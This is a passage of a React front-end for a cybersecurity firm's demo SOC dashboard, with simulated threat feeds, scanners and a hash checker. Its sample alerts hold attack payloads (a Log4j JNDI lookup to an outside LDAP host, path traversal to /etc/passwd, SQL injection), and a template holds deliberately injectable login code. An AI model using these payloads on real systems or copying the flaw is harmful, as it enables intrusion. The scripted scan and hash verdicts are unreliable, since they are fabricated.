import React, { useState, useEffect } from "react";
import {
  Shield,
  Terminal,
  Activity,
  RefreshCw,
  Code,
  FileCheck,
  CheckCircle2,
  Info,
  Send,
  Zap,
  Briefcase,
  Mail,
  Check,
  Play,
  CheckSquare,
  Download,
  ExternalLink
} from "lucide-react";
import {
  ECOSYSTEM_PORTALS,
  ECOSYSTEM_APIS,
  SOCIAL_PROFILES,
  CORPORATE_REGISTRATION,
  aligned
} from "./constants/ecosystemData";
import { AiSocDashboard } from "./components/AiSocDashboard";
import { Footer } from "./components/footer/Footer";
import { Header } from "./components/header/Header";
import { EcosystemStrip } from "./components/navigation/EcosystemStrip";
import { MobileNav } from "./components/navigation/MobileNav";
import EcosystemDiscovery from "./components/EcosystemDiscovery";
import type { ViewType, AiTab } from "./types/app";
import CookieConsent from "./components/CookieConsent";
import HomeView from "./views/HomeView";
import IntelView from "./views/IntelView";
import AiView from "./views/AiView";
import ToolsView from "./views/ToolsView";
import BlogView from "./views/BlogView";
import ApiView from "./views/ApiView";
import LegalPages from "./views/LegalPages";
import ServicePages from "./views/ServicePages";


// Interface definitions based on backend server capabilities
interface ThreatAlert {
  id: string;
  timestamp: string;
  sourceIp: string;
  targetCountry: string;
  service: string;
  threatType: string;
  severity: "low" | "medium" | "high" | "critical" | string;
  payload: string;
  mitigation: string;
}

interface SecurityStats {
  totalBlocks24h: number;
  activeThreatsCounter: number;
  threatLevel: string;
  mitigationSuccessRate: string;
  sentinelNodeStatus: string;
  hqLocation: string;
  isoCompliance: string;
  soc2Compliance: string;
  dpdpCompliance: string;
}

interface CveItem {
  id: string;
  title: string;
  score: number;
  published: string;
  mitigation: string;
}

export default function App() {
  // Top-level navigation tab: home (Official Website Gateway), intel (Sentinel APEX), ai (AI Security Hub), tools (ThreatCore Tools), blog (Advisories & Academy), api (Ecosystem REST APIs)
  const [currentView, setCurrentView] = useState<ViewType>("home");

  // In-app ROI Calculator States
  const [roiStaff, setRoiStaff] = useState(3);
  const [roiEndpoints, setRoiEndpoints] = useState(250);
  const [roiBreach, setRoiBreach] = useState(150000);

  // Dynamic page title per view, and scroll to top on every view change.
  // onNavigate is wired directly to setCurrentView (Footer/Header/MobileNav/
  // ServicePages all pass it through unwrapped) with no scroll handling of
  // its own, so a click on a footer link — the case most likely to happen
  // while already scrolled far down the page — swapped the rendered content
  // without moving the viewport, making the new content appear invisible
  // until the user manually scrolled back up.
  useEffect(() => {
    window.scrollTo(0, 0);
    const titles: Record<string, string> = {
      home: "CYBERDUDEBIVASH® | AI-Powered Cybersecurity Platform",
      intel: "Sentinel APEX™ Threat Intelligence | CYBERDUDEBIVASH®",
      ai: "AI Security Hub & Audit | CYBERDUDEBIVASH®",
      tools: "ThreatCore™ Security Tools | CYBERDUDEBIVASH®",
      blog: "Research Blog & Advisories | CYBERDUDEBIVASH®",
      api: "REST API Documentation | CYBERDUDEBIVASH®",
      about: "About Us | CYBERDUDEBIVASH®",
      privacy: "Privacy Policy | CYBERDUDEBIVASH®",
      terms: "Terms of Service | CYBERDUDEBIVASH®",
      copyright: "Copyright & IP | CYBERDUDEBIVASH®",
      soc: "Managed SOC-as-a-Service | CYBERDUDEBIVASH®",
      dpdp: "DPDP Act Compliance | CYBERDUDEBIVASH®",
      owasp: "OWASP LLM Red Team | CYBERDUDEBIVASH®",
      mssp: "Multi-Tenant MSSP Suite | CYBERDUDEBIVASH®",
      vciso: "vCISO Advisory | CYBERDUDEBIVASH®",
      pentest: "Penetration Testing | CYBERDUDEBIVASH®",
    };
    document.title = titles[currentView] ?? "CYBERDUDEBIVASH® | AI-Powered Cybersecurity Platform";
  }, [currentView]);

  // Core App states carrying forward from our baseline
  const [activeAiTab, setActiveAiTab] = useState<AiTab>("log");
  const [loadingFeed, setLoadingFeed] = useState(false);
  const [alerts, setAlerts] = useState<ThreatAlert[]>([
    {
      id: "AL-8893",
      timestamp: new Date(Date.now() - 4000).toISOString(),
      sourceIp: "185.220.101.5",
      targetCountry: "IN",
      service: "SSL/TLS Portal",
      threatType: "Brute-Force Attack Blocked",
      severity: "high",
      payload: "SSH-2.0-Go_SFTP_Client_1.1",
      mitigation: "IP automatically null-routed by AI Security Hub Sentinel"
    },
    {
      id: "AL-8892",
      timestamp: new Date(Date.now() - 42000).toISOString(),
      sourceIp: "45.146.164.120",
      targetCountry: "US",
      service: "Enterprise Threat Intel",
      threatType: "Directory Traversal Attempt",
      severity: "medium",
      payload: "GET /../../../../etc/passwd HTTP/1.1",
      mitigation: "Filtered via CyberDude WAF engine"
    },
    {
      id: "AL-8891",
      timestamp: new Date(Date.now() - 120000).toISOString(),
      sourceIp: "109.238.10.82",
      targetCountry: "IN",
      service: "API gateway Tools",
      threatType: "Log4j JNDI Lookup Probe",
      severity: "critical",
      payload: "${jndi:ldap://109.238.10.82:1389/a}",
      mitigation: "Blocked at edge router, threat score registered as 98%"
    },
    {
      id: "AL-8890",
      timestamp: new Date(Date.now() - 360000).toISOString(),
      sourceIp: "223.190.81.44",
      targetCountry: "EU",
      service: "Sentinel APEX",
      threatType: "Port Scanning Activity",
      severity: "low",
      payload: "TCP SYN Sweep (Ports 21, 22, 23, 80, 443, 8080)",
      mitigation: "Alert logged, source IP flagged in blacklists"
    },
    {
      id: "AL-8889",
      timestamp: new Date(Date.now() - 600000).toISOString(),
      sourceIp: "91.240.118.50",
      targetCountry: "JP",
      service: "AI Security Hub",
      threatType: "SQL Injection Blocked",
      severity: "high",
      payload: "UNION SELECT username, password FROM users--",
      mitigation: "Query sanitized and blocked; client session terminated"
    }
  ]);

  const [stats, setStats] = useState<SecurityStats>({
    totalBlocks24h: 342981,
    activeThreatsCounter: 142,
    threatLevel: "ELEVATED",
    mitigationSuccessRate: "100.0%",
    sentinelNodeStatus: "Fully Operational",
    hqLocation: "Ragadi, Jajpur, Odisha, India",
    isoCompliance: aligned("iso27001") + " (certification in progress)",
    soc2Compliance: aligned("soc2") + " (formal audit in progress)",
    dpdpCompliance: aligned("dpdp") + " (self-assessed)"
  });

  const [cves, setCves] = useState<CveItem[]>([
    {
      id: "CVE-2026-1182",
      title: "Remote Code Execution in Cloud Orchestration Gateways",
      score: 9.8,
      published: "2026-06-25",
      mitigation: "Upgrade orchestrator components to v4.9.12 or patch via Sentinel IPS Rules"
    },
    {
      id: "CVE-2026-0421",
      title: "Authentication Bypass in Distributed Token Manager",
      score: 8.8,
      published: "2026-06-20",
      mitigation: "Revoke standard sessions, mandate hardware MFA integration"
    },
    {
      id: "CVE-2025-5490",
      title: "Memory Corruption in Core Network Packet Analyzer",
      score: 7.5,
      published: "2025-12-18",
      mitigation: "Compile with stack-protector enabled or deploy APEX runtime guard"
    }
  ]);

  const [feedTimestamp, setFeedTimestamp] = useState<string>(new Date().toLocaleTimeString());

  // AI Security Hub states
  const [analyzerInput, setAnalyzerInput] = useState<string>("");
  const [analyzerLoading, setAnalyzerLoading] = useState(false);
  const [analyzerReport, setAnalyzerReport] = useState<string>("");

  // ThreatCore Tools States
  const [toolSubdomainInput, setToolSubdomainInput] = useState("cyberdudebivash.com");
  const [scoutingActive, setScoutingInputActive] = useState(false);
  const [scoutLogs, setScoutLogs] = useState<string[]>([]);
  const [scoutResults, setScoutResults] = useState<{subdomain: string; ip: string; status: number}[]>([]);

  const [toolPortInput, setToolPortInput] = useState("103.142.12.98");
  const [portScanningActive, setPortScanningActive] = useState(false);
  const [portScanLogs, setPortScanLogs] = useState<string[]>([]);
  const [portScanResults, setPortScanResults] = useState<{port: number; service: string; state: string}[]>([]);

  const [hashInput, setHashInput] = useState("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
  const [hashReport, setHashReport] = useState<string | null>(null);

  // API Workspace playground state
  const [apiKey, setApiKey] = useState("cdb_live_key_" + Math.floor(Math.random() * 9000000 + 1000000));
  const [apiConsoleResponse, setApiConsoleResponse] = useState<string>('{\n  "message": "Click Send Request above to query Sentinel intelligence."\n}');
  const [apiEndpointSelected, setApiEndpointSelected] = useState<"feed" | "cves" | "stats">("feed");

  // Advanced God Mode Ecosystem States
  const [pingingPortalId, setPingingPortalId] = useState<string | null>(null);
  const [pingLogs, setPingLogs] = useState<string[]>([]);
  const [activeSocialFilter, setActiveSocialFilter] = useState<string>("All");
  const [activeEcosystemApiIndex, setActiveEcosystemApiIndex] = useState<number>(0);

  // Premium product Gumroad downloads/order helper
  const [purchasedProduct, setPurchasedProduct] = useState<string | null>(null);
  const [checkingOutProduct, setCheckingOutProduct] = useState<any | null>(null);
  const [checkoutModalOpen, setCheckoutModalOpen] = useState(false);
  const [paymentOption, setPaymentOption] = useState<"upi" | "card" | "crypto">("upi");
  const [checkoutSubmitted, setCheckoutSubmitted] = useState(false);

  // Contact / Lead Forms
  const [showContactModal, setShowContactModal] = useState(false);
  const [contactForm, setContactForm] = useState({
    name: "",
    email: "",
    company: "",
    message: ""
  });
  const [contactSubmitted, setContactSubmitted] = useState(false);

  // Dynamic live background counters
  const [activeNodesCount, setActiveNodesCount] = useState(1042);
  const [firewallLoad, setFirewallLoad] = useState(42);
  const [scanSpeedHz, setScanSpeedHz] = useState(5.82);

  // Live website logs ticker (simulates Image 4 logs)
  const [liveLogs, setLiveLogs] = useState<{time: string; severity: "CRITICAL" | "HIGH" | "MEDIUM" | "BLOCKED"; msg: string}[]>([
    { time: "02:17:43", severity: "CRITICAL", msg: "Ransomware lateral movement detected — 185.220.101.47 → LockBit 3.0" },
    { time: "02:17:44", severity: "BLOCKED", msg: "SENTINEL APEX™ auto-isolated DC-PROD-01 — threat neutralized" },
    { time: "02:18:01", severity: "HIGH", msg: "APT-29 C2 beacon — 91.108.56.130:443 — Cozy Bear campaign" },
    { time: "02:18:07", severity: "BLOCKED", msg: "C2 traffic blocked. IOC pushed to SIEM. SIGMA rule generated — CDB-2026-04817" },
    { time: "02:18:22", severity: "HIGH", msg: "Suspicious PowerShell exec — WORKSTATION-44 — MITRE T1059.001" },
    { time: "02:18:35", severity: "MEDIUM", msg: "DNS tunneling — ENDPOINT-12 → malware-cdn.ru — monitoring" },
    { time: "02:18:41", severity: "CRITICAL", msg: "Zero-day exploit attempt — CVE-2026-1337 — AI Shield™ active" },
    { time: "02:18:42", severity: "BLOCKED", msg: "Exploit neutralized. YARA rule deployed across all endpoints" }
  ]);

  // Fetch threat feed with retry mechanism to handle server health gracefully
  const fetchThreatFeed = async (retryCount = 0) => {
    setLoadingFeed(true);
    try {
      const res = await fetch("/api/security/threat-feed");
      if (res.ok) {
        const data = await res.json();
        setAlerts(data.alerts || []);
        if (data.statistics) {
          setStats(data.statistics);
        }
        if (data.recentCves) {
          setCves(data.recentCves);
        }
        setFeedTimestamp(new Date().toLocaleTimeString());
      } else {
        throw new Error(`Server returned status ${res.status}`);
      }
    } catch (e) {
      console.log("[Sentinel APEX] Feed sync offline (using resilient cached baseline data)");
      if (retryCount < 3) {
        setTimeout(() => fetchThreatFeed(retryCount + 1), 5000);
      }
    } finally {
      setLoadingFeed(false);
    }
  };

  // Initial load and ticker simulators
  useEffect(() => {
    // Handle redirect routing from 404.html
    const params = new URLSearchParams(window.location.search);
    const redirectPath = params.get("redirect");
    if (redirectPath) {
      // Clean up search parameters in URL bar without refreshing
      const cleanUrl = window.location.pathname + window.location.hash;
      window.history.replaceState({}, document.title, cleanUrl);

      // Extract the filename (e.g. /about.html or /soc-services.html)
      const page = redirectPath.split("/").pop();
      if (page) {
        if (page === "about.html" || page === "about") setCurrentView("about");
        else if (page === "privacy.html" || page === "privacy") setCurrentView("privacy");
        else if (page === "terms.html" || page === "terms" || page === "TERMS.md") setCurrentView("terms");
        else if (page === "copyright.html" || page === "copyright") setCurrentView("copyright");
        else if (page === "soc-services.html" || page === "soc") setCurrentView("soc");
        else if (page === "compliance.html" || page === "dpdp") setCurrentView("dpdp");
        else if (page === "bug-bounty.html" || page === "owasp") setCurrentView("owasp");
        else if (page === "vciso.html" || page === "vciso") setCurrentView("vciso");
        else if (page === "services.html" || page === "pentest") setCurrentView("pentest");
        else if (page === "platforms.html" || page === "platforms") setCurrentView("home");
        else if (page === "apps.html" || page === "tools") setCurrentView("tools");
        else if (page === "research.html" || page === "blog") setCurrentView("blog");
      }
    }

    fetchThreatFeed();

    // Live sync ticker for logs
    const logInterval = setInterval(() => {
      const hours = new Date().getHours().toString().padStart(2, "0");
      const minutes = new Date().getMinutes().toString().padStart(2, "0");
      const seconds = new Date().getSeconds().toString().padStart(2, "0");
      const logTime = `${hours}:${minutes}:${seconds}`;

      const randomIps = ["104.22.4.15", "185.220.101.99", "45.146.164.22", "19.2.22.144", "223.190.81.25"];
      const randomIp = randomIps[Math.floor(Math.random() * randomIps.length)];
      
      const newLogEvents: {severity: "CRITICAL" | "HIGH" | "MEDIUM" | "BLOCKED"; msg: string}[] = [
        { severity: "CRITICAL", msg: `SQL injection attempt blocked from ${randomIp} targeting transactional API` },
        { severity: "BLOCKED", msg: `IP null-routed: ${randomIp} flagged on active blacklist` },
        { severity: "HIGH", msg: `Credential stuffing probe from 172.67.2.148 blocked at Edge gateway` },
        { severity: "MEDIUM", msg: `Unsanitized PDF upload attempt rejected on compliance file upload` },
        { severity: "CRITICAL", msg: `Zero-day remote execution probe on node AP-NORTH prevented by AI Shield` },
        { severity: "BLOCKED", msg: `Session revoked for anomalous API payload sequence` }
      ];

      const selectedEvent = newLogEvents[Math.floor(Math.random() * newLogEvents.length)];
      
      setLiveLogs(prev => [
        { time: logTime, ...selectedEvent },
        ...prev.slice(0, 11)
      ]);
    }, 5000);

    // Dynamic stats generator
    const statsInterval = setInterval(() => {
      setFirewallLoad(prev => {
        const delta = Math.floor(Math.random() * 5) - 2;
        const next = prev + delta;
        return next > 95 ? 95 : next < 25 ? 25 : next;
      });
      setActiveNodesCount(prev => prev + (Math.random() > 0.5 ? 1 : -1));
      setScanSpeedHz(prev => {
        const delta = (Math.random() * 0.4) - 0.2;
        return parseFloat((prev + delta).toFixed(2));
      });
    }, 4000);

    return () => {
      clearInterval(logInterval);
      clearInterval(statsInterval);
    };
  }, []);

  // Pre-populate AI Analyzer inputs
  const applyPresetTemplate = (tab: typeof activeAiTab) => {
    switch (tab) {
      case "log":
        setAnalyzerInput(
          `Jul 28 11:24:02 core-node-1 nginx[3120]: 192.168.1.144 - - [28/Jul/2026:11:24:02 +0000] "GET /admin/db_backup.sql HTTP/1.1" 404 162 "https://cyberdudebivash.in" "Mozilla/5.0 (Nmap Scripting Engine; http://nmap.org/book/nse.html)"`
        );
        break;
      case "code":
        setAnalyzerInput(
          `// Vulnerable Node.js login endpoint code snippet\napp.post('/api/login', (req, res) => {\n  const query = "SELECT * FROM users WHERE email = '" + req.body.email + "' AND password = '" + req.body.password + "'";\n  db.query(query, (err, result) => {\n    if (err) throw err;\n    if (result.length > 0) {\n      res.json({ success: true, user: result[0] });\n    } else {\n      res.status(401).json({ error: "Invalid credentials" });\n    }\n  });\n});`
        );
        break;
      case "domain":
        setAnalyzerInput(
          `Domain: staging-api-sentinel-vault.net\nResolved IPs: 104.22.4.92, 172.67.2.148\nDNSSEC: Disabled\nSPF Record: v=spf1 include:mx-relay.com ~all\nDMARC: Not configured\nPorts Detected: 22/tcp (filtered), 80/tcp (open), 443/tcp (open), 8080/tcp (open)`
        );
        break;
      case "compliance":
        setAnalyzerInput(
          `Organizational Audit Context:\n1. All biometric customer logs are saved in plaintext CSV tables for debugging on staging VMs located in AP-SOUTH.\n2. Staff authentication is standard username/password without mandating hardware MFA tokens.\n3. Annual security assessments are logged and tracked via email rather than structured compliance repositories.`
        );
        break;
      case "chat":
        setAnalyzerInput(
          `Explain how CyberDudeBivash Sentinel APEX coordinates active mitigations against real-time API exploitation vectors.`
        );
        break;
    }
  };

  useEffect(() => {
    applyPresetTemplate(activeAiTab);
  }, [activeAiTab]);

  // Handle selecting log entry to investigate
  const handleSelectAlert = (alert: ThreatAlert) => {
    setCurrentView("ai");
    setActiveAiTab("log");
    setAnalyzerInput(
      `ALERT ID: ${alert.id}\nTIMESTAMP: ${alert.timestamp}\nSOURCE IP: ${alert.sourceIp}\nTARGET NODE: ${alert.targetCountry} Service: ${alert.service}\nTHREAT VECTOR: ${alert.threatType}\nATTACK PAYLOAD: ${alert.payload}\nMITIGATION STATE: ${alert.mitigation}`
    );
  };

  // Submit for AI Security Audit (Express + Gemini endpoint)
  const handleAnalyze = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!analyzerInput.trim()) return;

    setAnalyzerLoading(true);
    setAnalyzerReport("");
    try {
      const response = await fetch("/api/security/analyze", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: activeAiTab,
          content: analyzerInput
        })
      });

      if (response.ok) {
        const data = await response.json();
        setAnalyzerReport(data.report);
      } else {
        const errData = await response.json();
        setAnalyzerReport(errData.report || errData.error || errData.fallback || "An error occurred during AI analysis.");
      }
    } catch (err) {
      setAnalyzerReport(`### AI Analysis offline\nFailed to establish connection to CyberDude AI Security Hub server. Check development console for details.`);
    } finally {
      setAnalyzerLoading(false);
    }
  };

  // Trigger subdomain scouting demo
  const runSubdomainScout = () => {
    if (scoutingActive) return;
    setScoutingInputActive(true);
    setScoutLogs([]);
    setScoutResults([]);
    
    const logs = [
      "Initializing ThreatCore Recon client...",
      "Connecting DNS authority resolvers at Odisha, India HQ...",
      "Scanning Certificate Transparency Logs for target domain...",
      "CT Logs match detected: 14 total entries...",
      "Brute-forcing common host prefixes using elite wordlist...",
      "Resolving target IP routes for active subdomains...",
      "Scout completed successfully. Threat score calculated."
    ];

    let delay = 0;
    logs.forEach((logLine, index) => {
      setTimeout(() => {
        setScoutLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${logLine}`]);
        if (index === logs.length - 1) {
          setScoutResults([
            { subdomain: "api-sentinel." + toolSubdomainInput, ip: "103.142.12.98", status: 200 },
            { subdomain: "staging-vault." + toolSubdomainInput, ip: "185.220.101.44", status: 403 },
            { subdomain: "internal-blog." + toolSubdomainInput, ip: "109.238.10.82", status: 200 },
            { subdomain: "tools-dev." + toolSubdomainInput, ip: "172.67.2.15", status: 404 }
          ]);
          setScoutingInputActive(false);
        }
      }, delay);
      delay += 800;
    });
  };

  // Trigger port scan demo
  const runPortScan = () => {
    if (portScanningActive) return;
    setPortScanningActive(true);
    setPortScanLogs([]);
    setPortScanResults([]);

    const steps = [
      `Resolving IP target route to ${toolPortInput}...`,
      "Sending SYN packets to top 100 industrial security ports...",
      "Awaiting socket responses via Sentinel Edge nodes...",
      "Filtering results and validating firewalled routes...",
      "Scan process finalized. ThreatCore report compiled."
    ];

    let delay = 0;
    steps.forEach((step, idx) => {
      setTimeout(() => {
        setPortScanLogs(prev => [...prev, `[+] ${step}`]);
        if (idx === steps.length - 1) {
          setPortScanResults([
            { port: 22, service: "SSH / SFTP", state: "Open (Unfiltered)" },
            { port: 80, service: "HTTP Web Port", state: "Open (Filter Active)" },
            { port: 443, service: "HTTPS (SSL/TLS)", state: "Open (TLS v1.3)" },
            { port: 8080, service: "Apache / Alternative Server", state: "Closed (Firewalled)" }
          ]);
          setPortScanningActive(false);
        }
      }, delay);
      delay += 900;
    });
  };

  // Trigger hash reputation check
  const runHashCheck = () => {
    if (!hashInput.trim()) return;
    
    // Simulate reputation lookup
    if (hashInput.toLowerCase().includes("e3b0c4") || hashInput.length < 32) {
      setHashReport(`### ThreatCore Hash Reputation Diagnostic
      
* **Target MD5/SHA256**: \`${hashInput}\`
* **Detection Status**: 🟢 SAFE / CLEAN
* **Reputation Index**: 0% Malicious Risk
* **File Classifier**: Empty file standard SHA-256 baseline or standard benign library. No known APT, ransom, or dropper vectors matching in active CDB databases.`);
    } else {
      setHashReport(`### ThreatCore Hash Reputation Diagnostic [WARNING]
      
* **Target MD5/SHA256**: \`${hashInput}\`
* **Detection Status**: 🔴 HIGH RISK MALICIOUS VECTOR DETECTED
* **Reputation Index**: 98% Cyber Threat Threat Level
* **Attributed Group**: LockBit Ransomware Group (CDB-APT-22 variant)
* **Associated Techniques**: MITRE T1486 (Data Encrypted for Impact), T1190 (Exploit Public-Facing Application)
* **Remediation Action**: Standard signature block generated. Ensure edge endpoint agents have YARA rules enabled.`);
    }
  };

  // God Mode: Interactive Ecosystem Portal Ping Tester
  const triggerPortalPing = (portalId: string, portalName: string, url: string) => {
    setPingingPortalId(portalId);
    setPingLogs([`[INIT] Launching autonomous handshake protocols to ${portalName}...`]);
    
    const steps = [
      { t: 200, m: `[RESOLVING] Performing DNS lookup for host ${url.replace("https://", "").replace("/", "")}...` },
      { t: 450, m: `[RESOLVED] Host IP pointed to secure Cloudflare proxy edge subnets.` },
      { t: 700, m: `[CONNECTING] Establishing TCP 3-way handshake over port 443 (HTTPS)...` },
      { t: 1000, m: `[TLS HANDSHAKE] Negotiating TLS v1.3 cryptographic session key. Cipher: TLS_AES_256_GCM_SHA384` },
      { t: 1300, m: `[CERTIFICATE] SSL certificate validated. Issued by: Cloudflare Inc ECC CA-3 (Expires: 2027)` },
      { t: 1600, m: `[HTTP GET] Sending HEAD / HTTP/2 request payload with authorization check...` },
      { t: 1900, m: `[RESPONSE] Status Code: 200 OK. Response Header Server: cloudflare` },
      { t: 2200, m: `[SUCCESS] ${portalName} (${url}) is ACTIVE, HEALTHY, and reporting 100.0% traffic integrity!` }
    ];

    steps.forEach((step) => {
      setTimeout(() => {
        setPingLogs(prev => [...prev, step.m]);
      }, step.t);
    });
  };

  // Advanced: Execute custom live API queries for any of the 8 routes
  const executeEcosystemApiRequest = (idx: number) => {
    setActiveEcosystemApiIndex(idx);
    const api = ECOSYSTEM_APIS[idx];
    setApiConsoleResponse(`// Connecting to ${api.url} ...\n// Authorization: Bearer ${apiKey}\n// Performing standard REST request...`);
    
    setTimeout(() => {
      if (api.responseType === "JSON") {
        setApiConsoleResponse(JSON.stringify(api.mockPayload, null, 2));
      } else {
        setApiConsoleResponse(api.mockPayload);
      }
    }, 800);
  };

  // Trigger simulated local API request (Legacy bridge)
  const testRestApiRequest = () => {
    setApiConsoleResponse('{\n  "status": "query_active",\n  "message": "Communicating with Odisha Sentinel center..."\n}');
    setTimeout(() => {
      if (apiEndpointSelected === "feed") {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/security/threat-feed",
          timestamp: new Date().toISOString(),
          threat_level: "ELEVATED",
          alerts_count: alerts.length,
          recent_alerts: alerts.slice(0, 3)
        }, null, 2));
      } else if (apiEndpointSelected === "cves") {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/recent-cves",
          timestamp: new Date().toISOString(),
          cves_count: cves.length,
          catalog: cves
        }, null, 2));
      } else {
        setApiConsoleResponse(JSON.stringify({
          status: "success",
          api_key_authenticated: true,
          endpoint: "/api/statistics",
          timestamp: new Date().toISOString(),
          statistics: stats
        }, null, 2));
      }
    }, 1000);
  };

  // Checkout modal for Gumroad products
  const handleCheckoutProduct = (product: any) => {
    setCheckingOutProduct(product);
    setCheckoutSubmitted(false);
    setCheckoutModalOpen(true);
  };

  const handleCheckoutSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setCheckoutSubmitted(true);
    if (typeof window !== "undefined" && (window as any).gtag) {
      (window as any).gtag("event", "purchase", {
        transaction_id: "T_" + Date.now(),
        value: checkingOutProduct ? parseFloat(checkingOutProduct.cost.replace(/[^\d.-]/g, "")) || 0 : 0,
        currency: "INR",
        items: [{
          item_id: checkingOutProduct?.id || "unknown",
          item_name: checkingOutProduct?.title || "Security Guide",
          price: checkingOutProduct ? parseFloat(checkingOutProduct.cost.replace(/[^\d.-]/g, "")) || 0 : 0,
          quantity: 1
        }]
      });
    }
    setTimeout(() => {
      setPurchasedProduct(checkingOutProduct.id);
      setCheckoutModalOpen(false);
      setCheckoutSubmitted(false);
    }, 2000);
  };

  // Lead inquiry form submit
  const handleContactSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setContactSubmitted(true);
    if (typeof window !== "undefined" && (window as any).gtag) {
      (window as any).gtag("event", "generate_lead", {
        event_category: "engagement",
        event_label: "contact_inquiry",
        company_name: contactForm.company,
        client_name: contactForm.name
      });
    }
    setTimeout(() => {
      setShowContactModal(false);
      setContactSubmitted(false);
      setContactForm({ name: "", email: "", company: "", message: "" });
    }, 3000);
  };

  // severity badging utility
  const getSeverityBadge = (severity: string) => {
    const norm = severity.toLowerCase();
    if (norm === "critical") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-red-950 text-red-400 border border-red-800 uppercase animate-pulse">CRITICAL</span>;
    }
    if (norm === "high") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-orange-950 text-orange-400 border border-orange-800 uppercase">HIGH</span>;
    }
    if (norm === "medium") {
      return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-yellow-950 text-yellow-400 border border-yellow-800 uppercase">MEDIUM</span>;
    }
    return <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-slate-900 text-slate-400 border border-slate-800 uppercase">LOW</span>;
  };

  // Gumroad checklists static data
  const premiumProducts = [
    { id: "ai_tool", title: "AI Security Toolkit OWASP LLM", price: "₹499", desc: "Complete OWASP LLM Top 10 guide - checklists, test cases, and mitigation vectors." },
    { id: "iso_tool", title: "Compliance Starter Pack ISO 27001", price: "₹999", desc: "ISO 27001:2022 gap analysis models, SoA document, and standard policy library." },
    { id: "red_tool", title: "Red Team Playbook MITRE ATT&CK", price: "₹1,499", desc: "12 adversary simulation pipelines mapped to MITRE ATT&CK security chains." },
    { id: "zt_tool", title: "Zero Trust Blueprint NIST 800-207", price: "₹799", desc: "ZTA implementation guide - identity authentication architecture, microsegmentation models." },
    { id: "dpdp_tool", title: "DPDP Act Compliance Kit INDIA", price: "₹699", desc: "Data Fiduciary obligations, consent framework templates, and breach notification SOP." }
  ];

  return (
    <div className="min-h-screen bg-[#06080a] text-slate-300 font-sans flex flex-col selection:bg-cyan-500/30 selection:text-cyan-200">
      {/* Skip to main content — accessibility */}
      <a href="#main-content" className="skip-to-content">Skip to main content</a>

      {/* 1. SECURE ANNOUNCEMENT & UTILITY BAR */}
      <div className="bg-[#080d12] text-[11px] border-b border-slate-900 py-1.5 px-6 flex flex-wrap items-center justify-between gap-3 text-slate-400 font-mono">
        <div className="flex items-center gap-2">
          <span className="inline-block w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
          <span className="text-slate-200 font-bold">🛡️ INTERACTIVE DEMO:</span>
          <span className="truncate max-w-[280px] sm:max-w-none text-slate-400">Explore our simulated AI SOC command center below &bull; illustrative data</span>
        </div>
        <div className="flex items-center gap-4 text-xs">
          <span className="hidden sm:inline-block">🕐 Mon–Sat 9AM–7PM IST</span>
          <span className="hidden md:inline-block text-cyan-400">Secure Network Hub: Ragadi, Odisha, IN</span>
          <div className="flex items-center gap-1.5 text-slate-300">
            <Mail className="w-3.5 h-3.5 text-cyan-500" />
            <span>bivash@cyberdudebivash.com</span>
          </div>
        </div>
      </div>
      <Header
        currentView={currentView}
        onNavigate={setCurrentView}
        onContactClick={() => setShowContactModal(true)}
        onOpenAiTab={setActiveAiTab}
        onRunHashCheck={runHashCheck}
      />

      <EcosystemStrip />
      <MobileNav currentView={currentView} onNavigate={setCurrentView} />

      {/* 4. MAIN WORKSPACE VIEW ROUTER */}
      <main id="main-content" className="flex-1">

        {/* ================= VIEW 1: HOME ================= */}
        {currentView === "home" && (
          <HomeView
            liveLogs={liveLogs}
            pingingPortalId={pingingPortalId}
            pingLogs={pingLogs}
            activeSocialFilter={activeSocialFilter}
            purchasedProduct={purchasedProduct}
            premiumProducts={premiumProducts}
            onPortalPing={triggerPortalPing}
            onClosePingTerminal={() => setPingingPortalId(null)}
            onSocialFilterChange={setActiveSocialFilter}
            onCheckoutProduct={handleCheckoutProduct}
            onContact={() => setShowContactModal(true)}
            onNavigate={setCurrentView}
          />
        )}

                {/* ================= VIEW 2: INTEL ================= */}
        {currentView === "intel" && (
          <IntelView
            alerts={alerts}
            cves={cves}
            loadingFeed={loadingFeed}
            firewallLoad={firewallLoad}
            scanSpeedHz={scanSpeedHz}
            onRefreshFeed={fetchThreatFeed}
            onSelectAlert={handleSelectAlert}
          />
        )}

                {/* ================= VIEW 3: AI ================= */}
        {currentView === "ai" && (
          <AiView
            activeAiTab={activeAiTab}
            analyzerInput={analyzerInput}
            analyzerLoading={analyzerLoading}
            analyzerReport={analyzerReport}
            onTabChange={(tab) => { setActiveAiTab(tab); applyPresetTemplate(tab); }}
            onInputChange={setAnalyzerInput}
            onResetTemplate={() => applyPresetTemplate(activeAiTab)}
            onAnalyze={handleAnalyze}
          />
        )}

                {/* ================= VIEW 4: TOOLS ================= */}
        {currentView === "tools" && (
          <ToolsView
            toolSubdomainInput={toolSubdomainInput}
            scoutingActive={scoutingActive}
            scoutLogs={scoutLogs}
            scoutResults={scoutResults}
            toolPortInput={toolPortInput}
            portScanningActive={portScanningActive}
            portScanLogs={portScanLogs}
            portScanResults={portScanResults}
            hashInput={hashInput}
            hashReport={hashReport}
            onSubdomainInputChange={setToolSubdomainInput}
            onPortInputChange={setToolPortInput}
            onHashInputChange={setHashInput}
            onRunScout={runSubdomainScout}
            onRunPortScan={runPortScan}
            onRunHashCheck={runHashCheck}
            onSetBadHash={() => setHashInput("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")}
          />
        )}

                {/* ================= VIEW 5: BLOG ================= */}
        {currentView === "blog" && <BlogView />}

                {/* ================= VIEW 6: API ================= */}
        {currentView === "api" && (
          <ApiView
            apiKey={apiKey}
            apiConsoleResponse={apiConsoleResponse}
            activeEcosystemApiIndex={activeEcosystemApiIndex}
